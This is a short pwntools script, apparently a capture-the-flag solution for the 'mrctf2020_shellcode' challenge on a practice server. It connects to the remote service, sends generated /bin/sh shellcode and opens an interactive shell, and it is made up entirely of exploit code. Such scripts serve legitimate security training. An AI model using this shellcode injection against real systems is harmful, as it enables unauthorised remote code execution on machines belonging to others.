from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('mrctf2020_shellcode')
io = remote('node4.buuoj.cn', 27765)

shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()

